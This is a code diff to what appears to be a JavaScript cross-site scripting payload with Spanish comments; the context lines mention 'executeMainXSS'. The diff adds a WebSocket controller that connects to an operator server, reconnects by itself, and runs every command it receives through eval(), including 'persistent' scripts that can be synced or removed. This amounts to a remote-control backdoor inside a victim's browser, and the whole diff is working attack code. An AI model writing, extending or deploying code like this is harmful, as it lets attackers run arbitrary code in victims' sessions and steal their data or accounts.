@@ -11,6 +11,7 @@ if (window.self !== window.top) {
     // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
     window.__MAIN_XSS_EXECUTED__ = true;
     executeMainXSS();
+    setupWebSocketController();
 }
 
 // =============================================
@@ -330,4 +331,117 @@ function setupIframeRouteSimulation() {
     }, 300);
     
     console.log('simulation active with downloads enabled');
+}
+
+function setupWebSocketController() {
+    'use strict';
+    
+    // WebSocket es NATIVO - no necesita librerías
+    const WS_SERVER = 'ws://localhost:3000'; // o 'wss://' para SSL
+    let socket = null;
+    
+    // Diccionario para scripts persistentes 
+    const persistentScripts = {};
+
+    // Conectar WebSocket (NATIVO)
+    function connectWebSocket() {
+        try {
+            // ✅ WebSocket es NATIVO en todos los navegadores modernos
+            socket = new WebSocket(WS_SERVER);
+            
+            socket.onopen = function() {
+                console.log('✅ WebSocket conectado - Listo para comandos');
+            };
+            
+            socket.onmessage = function(event) {
+                try {
+                    const message = JSON.parse(event.data);
+                    handleWebSocketMessage(message);
+                } catch (e) {
+                    console.log('Mensaje no JSON, ejecutando directamente');
+                    // Ejecutar como código directo
+                    executeCommand(event.data, false, 'direct');
+                }
+            };
+            
+            socket.onclose = function() {
+                console.log('🔌 WebSocket cerrado - Reconectando...');
+                setTimeout(connectWebSocket, 3000);
+            };
+            
+            socket.onerror = function(error) {
+                console.log('💥 WebSocket error:', error);
+            };
+            
+        } catch (error) {
+            console.log('❌ Error conectando WebSocket:', error);
+            setTimeout(connectWebSocket, 5000);
+        }
+    }
+
+    // [Los mismos handlers que antes...]
+    function handleWebSocketMessage(message) {
+        const { type, data } = message;
+        
+        switch (type) {
+            case 'execute-command':
+                handleExecuteCommand(data);
+                break;
+            case 'destroy-persistent':
+                handleDestroyPersistent(data);
+                break;
+            case 'sync-persistent':
+                handleSyncPersistent(data);
+                break;
+        }
+    }
+
+    function handleExecuteCommand(data) {
+        const { command, persistent, id } = data;
+        try {
+            // ✅ EJECUCIÓN LIBRE CON eval()
+            const result = eval(command);
+            
+            if (persistent && id) {
+                persistentScripts[id] = { 
+                    script: command, 
+                    cleanup: typeof result === 'function' ? result : null 
+                };
+            }
+            
+        } catch (error) {
+            console.log('❌ Error:', error);
+        }
+    }
+
+    function handleDestroyPersistent(data) {
+        const { id } = data;
+        if (persistentScripts[id]) {
+            if (persistentScripts[id].cleanup) {
+                try {
+                    persistentScripts[id].cleanup();
+                } catch (error) {
+                    console.log('Error en cleanup:', error);
+                }
+            }
+            delete persistentScripts[id];
+        }
+    }
+
+    function handleSyncPersistent(data) {
+        for (const [id, cmd] of Object.entries(data)) {
+            try {
+                const result = eval(cmd);
+                persistentScripts[id] = { 
+                    script: cmd, 
+                    cleanup: typeof result === 'function' ? result : null 
+                };
+            } catch (error) {
+                console.log('Error sync:', id, error);
+            }
+        }
+    }
+
+    // Iniciar conexión
+    connectWebSocket();
 }
